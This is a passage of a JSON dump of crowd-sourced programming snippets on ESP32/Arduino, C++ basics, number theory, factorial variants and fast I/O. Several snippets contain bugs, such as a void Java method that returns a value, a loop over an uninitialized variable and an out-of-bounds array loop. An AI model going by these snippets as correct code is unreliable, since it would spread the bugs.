    "reg_date": "2021-10-12T11:40:01.000Z"
  },
  {
    "id": 1951,
    "keyword": null,
    "link": null,
    "title": " esp32 arduino mqtt",
    "description": "#include <WiFi.h> #include <PubSubClient.h>  // Replace the next variables with your SSID/Password combination const char* ssid = \"REPLACE_WITH_YOUR_SSID\"; const char* password = \"REPLACE_WITH_YOUR_PASSWORD\";  // Add your MQTT Broker IP address, example: //const char* mqtt_server = \"192.168.1.144\"; const char* mqtt_server = \"YOUR_MQTT_BROKER_IP_ADDRESS\";  WiFiClient espClient; PubSubClient client(espClient);  void setup() {   client.setServer(mqtt_server, 1883);   client.setCallback(callback); }  void setup_wifi() {   WiFi.begin(ssid, password);   while (WiFi.status() != WL_CONNECTED) {     delay(500);     Serial.print(\".\");   } }  void callback(char* topic, byte* message, unsigned int length) {   // calback function for arrived message   Serial.print(\"Message arrived on topic: \");   Serial.print(topic);   Serial.print(\". Message: \");   String messageTemp; }  void reconnect() {   // Loop until we're reconnected   while (!client.connected()) {     Serial.print(\"Attempting MQTT connection...\");     // Attempt to connect     if (client.connect(\"ESP8266Client\")) {       Serial.println(\"connected\");       // Subscribe       client.subscribe(\"esp32/output\");     } else {       Serial.print(\"failed, rc=\");       Serial.print(client.state());       Serial.println(\" try again in 5 seconds\");       // Wait 5 seconds before retrying       delay(5000);     }   } } void loop() {   if (!client.connected()) {     reconnect();   }   client.loop();     // for publish   // client.publish(\"esp32/humidity\", humString); }\n  1   2   3   4   5   6   7   8   9  10  11  12  13  14  15  16  17  18  19  20  21  22  23  24  25  26  27  28  29  30  31  32  33  34  35  36  37  38  39  40  41  42  43  44  45  46  47  48  49  50  51  52  53  54  55  56  57  58  59  60  61  62  63  64  65  66  67  68  69  70  71  72  73  74  75  76  77  78  79  80  81  82  83  84  85  86  87  88  89  90  91  92  93  94  95  96  97  98  99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129\n",
    "reg_date": "2021-10-12T11:40:01.000Z"
  },
  {
    "id": 1952,
    "keyword": null,
    "link": null,
    "title": " esp32 restart from code",
    "description": "ESP.restart(); // to restart ESP32 from within sketch\n",
    "reg_date": "2021-10-12T11:40:01.000Z"
  },
  {
    "id": 1953,
    "keyword": null,
    "link": null,
    "title": " esp8266 builtin led",
    "description": "void setup() {   pinMode(LED_BUILTIN, OUTPUT);     // Initialize the BUILTIN_LED pin as an output   }  // the loop function runs over and over again forever void loop() {   digitalWrite(LED_BUILTIN, LOW);   // Turn the LED on (Note that LOW is the voltage level                                     // but actually the LED is on; this is because                                      // it is acive low on the ESP-01)      delay(100);                      // Wait for a second   digitalWrite(LED_BUILTIN, HIGH);  // Turn the LED off by making the voltage HIGH      delay(100);                      // Wait for two seconds (to demonstrate the active low LED) }\n",
    "reg_date": "2021-10-12T11:40:01.000Z"
  },
  {
    "id": 1954,
    "keyword": null,
    "link": null,
    "title": " esp idf c++",
    "description": "#include <stdio.h> #include \"freertos/FreeRTOS.h\" #include \"freertos/task.h\" #include \"esp_system.h\" #include \"esp_spi_flash.h\"  extern \"C\" {     void app_main(void); }  void app_main() {     printf(\"Hello PlatformIO!\\n\"); } \n",
    "reg_date": "2021-10-12T11:40:01.000Z"
  },
  {
    "id": 1955,
    "keyword": null,
    "link": null,
    "title": " estimateaffine3d example c++",
    "description": "estimateaffine3d\n",
    "reg_date": "2021-10-12T11:40:01.000Z"
  },
  {
    "id": 1956,
    "keyword": null,
    "link": null,
    "title": " estructura c++",
    "description": "struct Par  {     int a, b;     // constructor base     Par() { a = b = 0; }     // destructor base     ~Par() { cout << \"hecho...\" << endl; }     void setA(int n) { a = n; }     void setB(int n) { b = n; }     void mostrar()      {         cout << \"a = \" << a << \", b = \" << b << \"; suma = \" << a+b << endl;     } };\n",
    "reg_date": "2021-10-12T11:40:01.000Z"
  },
  {
    "id": 1957,
    "keyword": null,
    "link": null,
    "title": " euclid algorithm",
    "description": "int Euclid(int a, int b) {     int r;     while(b != 0)      {          r = a % b;          a = b;           b = r;      }     return a;  }\nfunction gcd(a, b)     if b = 0         return a     else         return gcd(b, a mod b) \n function mcd($a,$b) { \twhile($b) list($a,$b)=array($b,$a%$b); \treturn $a; }\ndef MCD(a,b):     while b != 0:         a, b = b, a % b     return a\n",
    "reg_date": "2021-10-12T11:40:01.000Z"
  },
  {
    "id": 1958,
    "keyword": null,
    "link": null,
    "title": " euler's totient function c++",
    "description": "// C program to calculate Euler's Totient Function  #include <stdio.h>   int phi(int n)  {  \tint result = n; // Initialize result as n   \t// Consider all prime factors of n and subtract their  \t// multiples from result  \tfor (int p = 2; p * p <= n; ++p) {  \t\t \t\t// Check if p is a prime factor.  \t\tif (n % p == 0) {  \t\t\t \t\t\t// If yes, then update n and result  \t\t\twhile (n % p == 0)  \t\t\t\tn /= p;  \t\t\tresult -= result / p;  \t\t}  \t}   \t// If n has a prime factor greater than sqrt(n)  \t// (There can be at-most one such prime factor)  \tif (n > 1)  \t\tresult -= result / n;  \treturn result;  }   // Driver program to test above function  int main()  {  \tint n;  \tfor (n = 1; n <= 10; n++)  \t\tprintf(\"phi(%d) = %d\\n\", n, phi(n));  \treturn 0;  }  \n",
    "reg_date": "2021-10-12T11:40:02.000Z"
  },
  {
    "id": 1959,
    "keyword": null,
    "link": null,
    "title": " euler phi gfg",
    "description": "// C program to calculate Euler's Totient Function  #include <stdio.h>   int phi(int n)  {  \tint result = n; // Initialize result as n   \t// Consider all prime factors of n and subtract their  \t// multiples from result  \tfor (int p = 2; p * p <= n; ++p) {  \t\t \t\t// Check if p is a prime factor.  \t\tif (n % p == 0) {  \t\t\t \t\t\t// If yes, then update n and result  \t\t\twhile (n % p == 0)  \t\t\t\tn /= p;  \t\t\tresult -= result / p;  \t\t}  \t}   \t// If n has a prime factor greater than sqrt(n)  \t// (There can be at-most one such prime factor)  \tif (n > 1)  \t\tresult -= result / n;  \treturn result;  }   // Driver program to test above function  int main()  {  \tint n;  \tfor (n = 1; n <= 10; n++)  \t\tprintf(\"phi(%d) = %d\\n\", n, phi(n));  \treturn 0;  }  \n",
    "reg_date": "2021-10-12T11:40:02.000Z"
  },
  {
    "id": 1960,
    "keyword": null,
    "link": null,
    "title": " evaluate reverse polish notation gfg",
    "description": "public class Test {   \tpublic static void main(String[] args) throws IOException { \t\tString[] tokens = new String[] { \"2\", \"1\", \"+\", \"3\", \"*\" }; \t\tSystem.out.println(evalRPN(tokens)); \t}   \tpublic static int evalRPN(String[] tokens) { \t\tint returnValue = 0; \t\tString operators = \"+-*/\";   \t\tStack<String> stack = new Stack<String>();   \t\tfor (String t : tokens) { \t\t\tif (!operators.contains(t)) { //push to stack if it is a number \t\t\t\tstack.push(t); \t\t\t} else {//pop numbers from stack if it is an operator \t\t\t\tint a = Integer.valueOf(stack.pop()); \t\t\t\tint b = Integer.valueOf(stack.pop()); \t\t\t\tswitch (t) { \t\t\t\tcase \"+\": \t\t\t\t\tstack.push(String.valueOf(a + b)); \t\t\t\t\tbreak; \t\t\t\tcase \"-\": \t\t\t\t\tstack.push(String.valueOf(b - a)); \t\t\t\t\tbreak; \t\t\t\tcase \"*\": \t\t\t\t\tstack.push(String.valueOf(a * b)); \t\t\t\t\tbreak; \t\t\t\tcase \"/\": \t\t\t\t\tstack.push(String.valueOf(b / a)); \t\t\t\t\tbreak; \t\t\t\t} \t\t\t} \t\t}   \t\treturnValue = Integer.valueOf(stack.pop());   \t\treturn returnValue; \t} }\n  [\"2\", \"1\", \"+\", \"3\", \"*\"] -> ((2 + 1) * 3) -> 9   [\"4\", \"13\", \"5\", \"/\", \"+\"] -> (4 + (13 / 5)) -> 6 \n",
    "reg_date": "2021-10-12T11:40:02.000Z"
  },
  {
    "id": 1961,
    "keyword": null,
    "link": null,
    "title": " even and odd in c++",
    "description": "#include <iostream> using namespace std;  int main() { \tint n; \tcout << \"Enter an integer: \"; \tcin >> n; \t(n % 2 == 0) ? cout << n << \" Is Even.\" : cout << n << \" Is Odd.\"; }\n",
    "reg_date": "2021-10-12T11:40:02.000Z"
  },
  {
    "id": 1962,
    "keyword": null,
    "link": null,
    "title": " event keyword C#",
    "description": "//EN The event keyword is used to declare an event in a publisher class. //FR Le mot cl&eacute; event sert &agrave; d&eacute;clarer un &eacute;v&eacute;nement dans une classe d&rsquo;&eacute;diteur.  public event System.Action myEvent; myEvent?.Invoke();  public event System.Action<T> myEventWithType; myEventWithType?.invoke(T);\nprivate void panel1_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)  { }  private void panel1_MouseEnter(object sender, System.EventArgs e)   private void panel1_MouseHover(object sender, System.EventArgs e)     private void panel1_MouseLeave(object sender, System.EventArgs e)    private void panel1_MouseMove(object sender, System.Windows.Forms.MouseEventArgs e)    private void panel1_MouseWheel(object sender, System.Windows.Forms.MouseEventArgs e)         private void panel1_MouseUp(object sender, System.Windows.Forms.MouseEventArgs e)   private void panel1_Paint(object sender, System.Windows.Forms.PaintEventArgs e)   private void clearButton_Click(object sender, System.EventArgs e)      0 \n",
    "reg_date": "2021-10-12T11:40:02.000Z"
  },
  {
    "id": 1963,
    "keyword": null,
    "link": null,
    "title": " ex:Roblox",
    "description": "am DinoPlayz    \n",
    "reg_date": "2021-10-12T11:40:02.000Z"
  },
  {
    "id": 1964,
    "keyword": null,
    "link": null,
    "title": " excel vba delete worksheet if exists",
    "description": "For Each ws In Worksheets     If ws.Name = \"asdf\" Then         Application.DisplayAlerts = False         Sheets(\"asdf\").Delete         Application.DisplayAlerts = True     End If Next  Sheets.Add(After:=Sheets(Sheets.count)).Name = \"asdf\" \n",
    "reg_date": "2021-10-12T11:40:02.000Z"
  },
  {
    "id": 1965,
    "keyword": null,
    "link": null,
    "title": " exception handling c++",
    "description": "try {    //do something } catch (const std::exception& e) {      std::cout << e.what(); // information from error printed }\ntry { \t//do } catch (...){ \t//if error do }\n// exceptions #include <iostream> using namespace std;  int main () {   try   {     throw 20;   }   catch (int e)   {     cout << \"An exception occurred. Exception Nr. \" << e << '\\n';   }   return 0; }\n",
    "reg_date": "2021-10-12T11:40:02.000Z"
  },
  {
    "id": 1966,
    "keyword": null,
    "link": null,
    "title": " exception out of range c",
    "description": " #include <iostream>       #include <stdexcept>       #include <vector>          int main (void) {   std::vector<int> myvector(10);   try {     myvector.at(20)=100;      // vector::at throws an out-of-range   }   catch (const std::out_of_range& oor) {     std::cerr << \"Out of Range error: \" << oor.what() << '\\n';   }   return 0; }\nDefines a type of object to be thrown as exception.  It reports errors that are consequence of attempt to access elements out of defined range.  It may be thrown by the member functions of std::bitset and std::basic_string, by std::stoi and std::stod families of functions, and by the bounds-checked member access functions (e.g. std::vector::at and std::map::at).\nclass out_of_range : public logic_error { public:   explicit out_of_range (const string& what_arg); };  EX.  // out_of_range example #include <iostream>       // std::cerr #include <stdexcept>      // std::out_of_range #include <vector>         // std::vector  int main (void) {   std::vector<int> myvector(10);   try {     myvector.at(20)=100;      // vector::at throws an out-of-range   }   catch (const std::out_of_range& oor) {     std::cerr << \"Out of Range error: \" << oor.what() << '\\n';   }   return 0; }\nReplace throw std::out_of_range; with throw std::out_of_range (\"blah\");. I.e. you need to create an object, you cannot throw a type.\n",
    "reg_date": "2021-10-12T11:40:02.000Z"
  },
  {
    "id": 1967,
    "keyword": null,
    "link": null,
    "title": " executing an opencv c++ code",
    "description": "g++ m.cpp -o app `pkg-config --cflags --libs opencv`\n",
    "reg_date": "2021-10-12T11:40:02.000Z"
  },
  {
    "id": 1968,
    "keyword": null,
    "link": null,
    "title": " exit() in c++",
    "description": "#include <stdlib.h>  int main(){   exit(1);  //quits program }\n",
    "reg_date": "2021-10-12T11:40:02.000Z"
  },
  {
    "id": 1969,
    "keyword": null,
    "link": null,
    "title": " exit: redefinition; '  declspec(noreturn)' or '[[noreturn]]'",
    "description": "//Override the definition in glut.h with that in stdlib.h. Place the stdlib.h line above the glut.h line in your code #include <stdlib.h> #include <GL/glut.h> \n",
    "reg_date": "2021-10-12T11:40:03.000Z"
  },
  {
    "id": 1970,
    "keyword": null,
    "link": null,
    "title": " expected initializer before 'isdigit'|",
    "description": "expected initializer before 'isdigit'\n",
    "reg_date": "2021-10-12T11:40:03.000Z"
  },
  {
    "id": 1971,
    "keyword": null,
    "link": null,
    "title": " expected number of trials to get n consecutive heads",
    "description": "#include \"bits/stdc++.h\" using namespace std;    // Driver Code int main() {     int N = 3;        // Formula for number of trails for     // N consecutive heads     cout << pow(2, N + 1) - 2;     return 0; }\n",
    "reg_date": "2021-10-12T11:40:03.000Z"
  },
  {
    "id": 1972,
    "keyword": null,
    "link": null,
    "title": " expected unqualified-id before 'if'",
    "description": "void loop(){  if(distanceCm < 21){   digitalWrite(13, HIGH); } else{   digitalWrite(13, LOW); } }\n",
    "reg_date": "2021-10-12T11:40:03.000Z"
  },
  {
    "id": 1973,
    "keyword": null,
    "link": null,
    "title": " explicit in c++ meaning",
    "description": "class String { public:     explicit String (int n); //allocate n bytes     String(const char *p); // initialize sobject with string p }; \nclass String { public:     String(int n); // allocate n bytes to the String object     String(const char *p); // initializes object with char *p }; \nString mystring = 'x'; \n",
    "reg_date": "2021-10-12T11:40:03.000Z"
  },
  {
    "id": 1974,
    "keyword": null,
    "link": null,
    "title": " explicit vs implicit c++",
    "description": "int x = 0; double y = 10.0f; x = y; //implicit conversion x = (int)y; //explicit conversion\n",
    "reg_date": "2021-10-12T11:40:03.000Z"
  },
  {
    "id": 1975,
    "keyword": null,
    "link": null,
    "title": " exponenciacion binaria",
    "description": "#include<bits/stdc++.h> using namespace std; typedef unsigned long long ull; //complexity O(log k) ull po(ull n,ull k){ \tull x=1; \twhile(k){ \t\tif(k&1) \t\t\tx*=n; \t\tn*=n; \t\tk>>=1; \t} \treturn x; } int main(){ \tull n,m;     //n^m \tcin>>n>>m; \tcout<<po(n,m); \treturn 0; }\n",
    "reg_date": "2021-10-12T11:40:03.000Z"
  },
  {
    "id": 1976,
    "keyword": null,
    "link": null,
    "title": " exponents c++",
    "description": "#include <iostream> #include <cmath> using namespace std; int main () {   double base, exponent, result;\t\t   base = 3.4;\t   exponent = 4.4;\t   result = pow(base, exponent);\t\t   cout << base << \"^\" << exponent << \" = \" << result;\t\t   return 0; }\npow(base, exponent); //must #include <cmath> to use pow()  example:   #include <iostream> #include <cmath> //must include this library  int main () {   \tint y;  \tint x =10;    \ty = pow(x,2); // y = x^2 }\n",
    "reg_date": "2021-10-12T11:40:03.000Z"
  },
  {
    "id": 1977,
    "keyword": null,
    "link": null,
    "title": " export gcc g++",
    "description": "export CC=/usr/local/bin/gcc  export CXX=/usr/local/bin/g++ \n",
    "reg_date": "2021-10-12T11:40:03.000Z"
  },
  {
    "id": 1978,
    "keyword": null,
    "link": null,
    "title": " expresiones regulares español",
    "description": "a+e*i? \n",
    "reg_date": "2021-10-12T11:40:03.000Z"
  },
  {
    "id": 1979,
    "keyword": null,
    "link": null,
    "title": " extended euclidean algorithm",
    "description": "def extendEuclidean(a, b, s1=1, s2=0, t1=0, t2=1):          if b:         r=a%b         return extendEuclidean(b, r, s2, s1-s2*(a//b), t2, t1-t2*(a//b))          return a, s1, t1\nint gcd(int a, int b, int& x, int& y) {     if (b == 0) {         x = 1;         y = 0;         return a;     }     int x1, y1;     int d = gcd(b, a % b, x1, y1);     x = y1;     y = x1 - y1 * (a / b);     return d; } \n",
    "reg_date": "2021-10-12T11:40:04.000Z"
  },
  {
    "id": 1980,
    "keyword": null,
    "link": null,
    "title": " extends c++",
    "description": "class Animal {   public:        move(); }  class Dog: public Animal { \tpublic:  \t\tmove(); };\n",
    "reg_date": "2021-10-12T11:40:04.000Z"
  },
  {
    "id": 1981,
    "keyword": null,
    "link": null,
    "title": " extension namespaces c++",
    "description": "// Instead of using one namespace namespace X {   int a;   int b;   int c;   int d; }  // Generate a namespace  namespace Y { // namespace definition   int a;   int b; }  namespace Y { // namespace extension   int c;   int d; }\n",
    "reg_date": "2021-10-12T11:40:04.000Z"
  },
  {
    "id": 1982,
    "keyword": null,
    "link": null,
    "title": " extern c++",
    "description": "// extern basically defines a global variable.  //fileA.cpp int i = 42; // declaration and definition  //fileB.cpp extern int i;  // declaration only. same as i in FileA  //fileC.cpp extern int i;  // declaration only. same as i in FileA  //fileD.cpp int i = 43; // LNK2005! 'i' already has a definition. extern int i = 43; // same error (extern is ignored on definitions) \n",
    "reg_date": "2021-10-12T11:40:04.000Z"
  },
  {
    "id": 1983,
    "keyword": null,
    "link": null,
    "title": " extra parameter in comparator function for sort",
    "description": "class TopicSorter{     Query query_; public:     TopicSorter(Query query){ query_ = query; }     bool operator()(Topic t1, Topic t2) const {     return compareTopics( t1 , t2 , query_);     } };\n",
    "reg_date": "2021-10-12T11:40:04.000Z"
  },
  {
    "id": 1984,
    "keyword": null,
    "link": null,
    "title": " fabs c++",
    "description": "/* fabs example */ #include <stdio.h>      /* printf */ #include <math.h>       /* fabs */  int main () {   printf (\"The absolute value of 3.1416 is %f\\n\", fabs (3.1416) );   printf (\"The absolute value of -10.6 is %f\\n\", fabs (-10.6) );   return 0; }  /* Output */  The absolute value of 3.1416 is 3.141600 The absolute value of -10.6 is 10.600000\n",
    "reg_date": "2021-10-12T11:40:04.000Z"
  },
  {
    "id": 1985,
    "keyword": null,
    "link": null,
    "title": " factorial",
    "description": "function BracketCombinations(num) {    return (1 / (num + 1)) * choose(2 * num, num); }  function fact(num) {   let sum = 1;   for (let i = 1; i <= num; i++) {     sum *= i;   }   return sum; }  function choose(num, k) {   return fact(num) / 2 * (fact(k) * 1 / fact(num - k)); }\nunsigned long long factorial(unsigned long long num){      if(num<=0)         return 1;      return num * factorial(num-1); }\n// FACTORIAL  // 5! = 5 * 4 *3 * 2 *1 = 120   const number = 5; let fact =1 ;  for(let i=number;i>=1;i--) {   console.log(i)   fact = fact * i; } console.log(\"FACTORIAL is :: \",fact);\n#include<stdio.h> #include<conio.h> void main() {    int fact, i, n;    fact = 1;    printf(\"Enter the number\\t\");    scanf(\"%d\" , &n);    for(i = 1; i <= n; i++)    {        fact = fact*i;    }    printf(\"Factorial of %d is %d\", n , fact);    getch(); }\npublic static void  factorial(int num){      if(num<=0)         return 1;      return num * factorial(num-1); }\n//Java program to find factorial of a numberimport java.util.Scanner;public class factorial{\t\tpublic static void main(String[] args)\t{\t\t//scanner class declaration\t\tScanner sc = new Scanner(System.in);\t\t//input from user\t\tSystem.out.print(\"Enter a number : \");\t\t\t\t\t\tint number = sc.nextInt();\t\tif(number >= 0)\t\t{\t\t\t//declare a variable to store factorial\t\t\tint fac = 1;\t\t\tfor(int i = number ; i >= 1 ; i--)\t\t\tfac = fac * i;\t\t\t//display the result\t\t\tSystem.out.println(\"Factorial of \"+number+\" is \"+fac);\t\t\t//closing scanner class(not compulsory, but good practice)\t\t}\t\telse\t\t\tSystem.out.println(\"Value is not defined, please re-enter the value\");\t\tsc.close();\t\t\t\t\t\t\t\t\t\t\t\t\t\t}}\n// METHOD ONE const factorialNumber = num => {     let factorials = []     for(let i = 1; i <= num; i++) factorials.push(i)     return factorials.reduce((acc , curr) => acc * curr, 1) }  // METHOD TWO const factorialNumber = num => {     let factorial = 1, i = 1     while(i <= num){ factorial *= i; i++ }     return factorial } // METHOD THREE function factorialNumber(num) {     if(num < 1) return 1     else return factorialNumber(num - 1) * num }\n",
    "reg_date": "2021-10-12T11:40:04.000Z"
  },
  {
    "id": 1986,
    "keyword": null,
    "link": null,
    "title": " factorial c++ without using function",
    "description": "#include<bits/stdc++.h> #include<stdio.h> using namespace std;  int fact(int i){ \tif (i <= 1) return 1;   \telse return i*fact(i-1); }  int main(){   \tios::sync_with_stdio(0);   \tcin.tie(0);   \tint N;   \tcin >> N;   \tcout << fact(N) << \"\\n\";   \treturn 0; }\n#include <iostream> using namespace std;  int main() { \tunsigned int num; //unsigned is used for not taking negetive values. \tunsigned long long factorial = 1; //Since the factorial a number can be large, so long long data type is used. \tcout << \"Give me any positive number :\t\"; \tcin >> num;  \tfor (int i = 1; i <= num; i++) { \t\tfactorial = factorial * i; \t} \tcout << \"Factorial of the given number is: \" << factorial; }\n#include <iostream>   //n! = n(n-1)! int factorial (int n) {   if (n ==0)   {     return 1;    }   else    { \treturn n * factorial(n-1);    } }\n",
    "reg_date": "2021-10-12T11:40:04.000Z"
  },
  {
    "id": 1987,
    "keyword": null,
    "link": null,
    "title": " factorial in c++",
    "description": "#include<bits/stdc++.h> #include<stdio.h> using namespace std;  int fact(int i){ \tif (i <= 1) return 1;   \telse return i*fact(i-1); }  int main(){   \tios::sync_with_stdio(0);   \tcin.tie(0);   \tint N;   \tcin >> N;   \tcout << fact(N) << \"\\n\";   \treturn 0; }\n#include <cmath>  int fact(int n){     return std::tgamma(n + 1);   }     // for n = 5 -> 5 * 4 * 3 * 2 = 120  //tgamma performas factorial with n - 1 -> hence we use n + 1\n#include <iostream>   //n! = n(n-1)! int factorial (int n) {   if (n ==0)   {     return 1;    }   else    { \treturn n * factorial(n-1);    } }\n#include <iostream>using namespace std;void factorial (int x);int main (){    int number;     int fact =1;    for (int i=1;i<=number;i++)    {        fact=fact*i;    }    cout <<\"fact\"<<number<<\"is \"<<fact;    return 0;}\n",
    "reg_date": "2021-10-12T11:40:04.000Z"
  },
  {
    "id": 1988,
    "keyword": null,
    "link": null,
    "title": " factorial using recursion in c++",
    "description": "#include<bits/stdc++.h> #include<stdio.h> using namespace std;  int fact(int i){ \tif (i <= 1) return 1;   \telse return i*fact(i-1); }  int main(){   \tios::sync_with_stdio(0);   \tcin.tie(0);   \tint N;   \tcin >> N;   \tcout << fact(N) << \"\\n\";   \treturn 0; }\n#include <iostream> using namespace std;  int factorial(int n) {     if (n < 0)         return (-1); /*Wrong value*/     if (n == 0)         return (1); /*Wrong value*/     else     {       return (n * factorial(n - 1));     } }  int main() {     int number, ans;     cin >> number;     ans = factorial(number);     cout << ans;     return 0; } \n#include <cmath>  int fact(int n){     return std::tgamma(n + 1);   }     // for n = 5 -> 5 * 4 * 3 * 2 = 120  //tgamma performas factorial with n - 1 -> hence we use n + 1\n#include <iostream>   //n! = n(n-1)! int factorial (int n) {   if (n ==0)   {     return 1;    }   else    { \treturn n * factorial(n-1);    } }\n",
    "reg_date": "2021-10-12T11:40:05.000Z"
  },
  {
    "id": 1989,
    "keyword": null,
    "link": null,
    "title": " factorion",
    "description": "#include <iostream> using namespace std; //FACTORION: suma de los factoriales de sus d&iacute;gitos  int factorial(int n);  int digits(uint n){ \t \tint cantidad = 1; \tint numero = n; \t \twhile(numero/10 != 0){ \t\tnumero = numero/10; \t\tcantidad++; \t} \tcout << \"Numero de digitos: \" << cantidad << endl << endl; \t \tint array[cantidad]; \tint i = 0; \t \twhile(n > 0){ \t\tint r = n % 10; \t\tarray[i] = r; \t\tcout << \"array[\" << i << \"] is \" << array[i] << endl; \t\ti++; \t\tn = n / 10; \t\t \t} \t \tint fact = 0, solucion = 0; \t \tfor(int u = 0; u <= cantidad; u++){ \t\tfact = factorial(array[u]); \t\tsolucion = solucion + fact; \t} \tcout << endl << \"solucion: \" << solucion << endl; \treturn fact; }    int factorial(int n){ \tint fact; \t \tif(n == 0){ \t\tfact = 1; \t}else{ \t\tfact = n * factorial(n-1); \t} \t \treturn fact; }   int main(){ \tcout << \"FUNCION FACTORI&Oacute;N\" << endl; \tcout << digits(215) << endl; \t \treturn 0; }\n",
    "reg_date": "2021-10-12T11:40:05.000Z"
  },
  {
    "id": 1990,
    "keyword": null,
    "link": null,
    "title": " fail() in c++",
    "description": "#include <iostream> using namespace std;  int main() {     int number;     do{         cin >> number;         if(cin.fail())             cout << \"Not a number \" << endl;     }while(!cin.fail());     cout << \"number is \" << number << endl;     system(\"pause\");     return 0; }\n",
    "reg_date": "2021-10-12T11:40:05.000Z"
  },
  {
    "id": 1991,
    "keyword": null,
    "link": null,
    "title": " fast gcd",
    "description": "int gcd(int a, int b) {     if (a == 0)         return b;     return gcd(b % a, a); }   \nunsigned int gcd(unsigned int u, unsigned int v) {     int shift;     if (u == 0) return v;     if (v == 0) return u;     shift = __builtin_ctz(u | v);     u >>= __builtin_ctz(u);     do {         v >>= __builtin_ctz(v);         if (u > v) {             unsigned int t = v;             v = u;             u = t;         }           v = v - u;     } while (v != 0);     return u << shift; }\n",
    "reg_date": "2021-10-12T11:40:05.000Z"
  },
  {
    "id": 1992,
    "keyword": null,
    "link": null,
    "title": " fast i/o in c++",
    "description": "ios_base::sync_with_stdio(false);     cin.tie(NULL);\n",
    "reg_date": "2021-10-12T11:40:05.000Z"
  },
  {
    "id": 1993,
    "keyword": null,
    "link": null,
    "title": " fast io",
    "description": "#include <bits/stdc++.h> using namespace std;  int main() {     ios_base::sync_with_stdio(false);     cin.tie(NULL);     return 0; }\n#define fast ios_base::sync_with_stdio(false); cin.tie(NULL);\nvoid fastInput(int &x)     {         bool neg=false;         register int c;         x =0;         c=getchar();         if(c=='-')         {             neg = true;             c=getchar();         }         for(;(c>47 && c<58);c=getchar())           \t//bit shifting is faster than other operation           \t//here code below is same as            \t//x = x*10 + c-48                        x = (x<<1) + (x<<3) +c -48;         if(neg)             x *=-1;     }\n",
    "reg_date": "2021-10-12T11:40:05.000Z"
  },
  {
    "id": 1994,
    "keyword": null,
    "link": null,
    "title": " fast io c++",
    "description": "#define fast ios_base::sync_with_stdio(false); cin.tie(NULL);\n#include <bits/stdc++.h> using namespace std;  template <typename T> void in(T& x) // fast input {     x = 0; T f = 1;     char ch = getchar();     while (!isdigit(ch)) f = ch == '-' ? - f : f, ch = getchar();     while (isdigit(ch)) x = x * 10 + ch - '0', ch = getchar();     x *= f; }  template<typename T> void out(T n) //fast output {  \tbool neg = 0;   \tif (n < 0)  \t\tn *= -1, neg = 1;   \tchar snum[20];  \tint i = 0;  \tdo \t{  \t\tsnum[i++] = n % 10 + '0';  \t\tn /= 10;  \t}   \twhile (n);  \t--i;   \tif (neg)  \t\tputchar('-');   \twhile (i >= 0)  \t\tputchar(snum[i--]);   \tputchar('\\n');  }   main() { //My Test   \tint n; \tin(n);   \tout(n); } \nfastio.pythonanywhere.com    /* A tool to optimize execution time of C++ codes by replacing methods of reading and writing variables */\n#define FastIO ios_base::sync_with_stdio(false); cin.tie(NULL); \n",
    "reg_date": "2021-10-12T11:40:05.000Z"
  },
  {
    "id": 1995,
    "keyword": null,
    "link": null,
    "title": " fast scan in c++",
    "description": "// Write this below line inside main function ios_base::sync_with_stdio(false);\n",
    "reg_date": "2021-10-12T11:40:05.000Z"
  },
  {
    "id": 1996,
    "keyword": null,
    "link": null,
    "title": " fast way to check if a number is prime C++",
    "description": "//O(sqrt(n)) bool isPrime(int num){     if(num <= 1) return false;     for(int i = 2; i <= sqrt(num); i++){           if(num % i == 0) return false;     }     return true; } \n",
    "reg_date": "2021-10-12T11:40:05.000Z"
  },
  {
    "id": 1997,
    "keyword": null,
    "link": null,
    "title": " faster solutions",
    "description": "#include <bits/stdc++.h> using namespace std;  #define ll long long ll ans = 0;  void solve(){ \t     cout << ans << \"\\n\"; }  int main() { \tios::sync_with_stdio(0); \tcin.tie(0); cout.tie(0);  \tint t, i=1; \tcin >> t; \twhile(t--) { \t\tcout << \"Case #\" << i << \": \"; \t\tsolve(); \t\t++i; \t} }\n",
    "reg_date": "2021-10-12T11:40:05.000Z"
  },
  {
    "id": 1998,
    "keyword": null,
    "link": null,
    "title": " fastinput c++",
    "description": "void fastInput(int &x)     {         bool neg=false;         register int c;         x =0;         c=getchar();         if(c=='-')         {             neg = true;             c=getchar();         }         for(;(c>47 && c<58);c=getchar())           \t//bit shifting is faster than other operation           \t//here code below is same as            \t//x = x*10 + c-48                        x = (x<<1) + (x<<3) +c -48;         if(neg)             x *=-1;     }\n",
    "reg_date": "2021-10-12T11:40:05.000Z"
  },
  {
    "id": 1999,
    "keyword": null,
    "link": null,
    "title": " fatal error: opencv2/opencv.hpp: No such file or directory",
    "description": "g++ m.cpp -o app `pkg-config --cflags --libs opencv` \n",
    "reg_date": "2021-10-12T11:40:06.000Z"
  },
  {
    "id": 2000,
    "keyword": null,
    "link": null,
    "title": " fcatorianls c++",
    "description": "#include <iostream>   //n! = n(n-1)! int factorial (int n) {   if (n ==0)   {     return 1;    }   else    { \treturn n * factorial(n-1);    } }\n",
    "reg_date": "2021-10-12T11:40:06.000Z"
  },
  {
    "id": 2001,
    "keyword": null,
    "link": null,
    "title": " fcfs preemptive scheduling program in c++",
    "description": "#include <iostream> #include <algorithm>  #include <iomanip>  using namespace std;  struct process {     int pid;     int arrival_time;     int burst_time;     int start_time;     int completion_time;     int turnaround_time;     int waiting_time;     int response_time; };  bool compareArrival(process p1, process p2)  {      return p1.arrival_time < p2.arrival_time; }  bool compareID(process p1, process p2)  {       return p1.pid < p2.pid; }  int main() {      int n;     struct process p[100];     float avg_turnaround_time;     float avg_waiting_time;     float avg_response_time;     float cpu_utilisation;     int total_turnaround_time = 0;     int total_waiting_time = 0;     int total_response_time = 0;     int total_idle_time = 0;     float throughput;      cout << setprecision(2) << fixed;      cout<<\"Enter the number of processes: \";     cin>>n;      for(int i = 0; i < n; i++) {         cout<<\"Enter arrival time of process \"<<i+1<<\": \";         cin>>p[i].arrival_time;         cout<<\"Enter burst time of process \"<<i+1<<\": \";         cin>>p[i].burst_time;         p[i].pid = i+1;         cout<<endl;     }      sort(p,p+n,compareArrival);      for(int i = 0; i < n; i++) {         p[i].start_time = (i == 0)?p[i].arrival_time:max(p[i-1].completion_time,p[i].arrival_time);         p[i].completion_time = p[i].start_time + p[i].burst_time;         p[i].turnaround_time = p[i].completion_time - p[i].arrival_time;         p[i].waiting_time = p[i].turnaround_time - p[i].burst_time;         p[i].response_time = p[i].start_time - p[i].arrival_time;          total_turnaround_time += p[i].turnaround_time;         total_waiting_time += 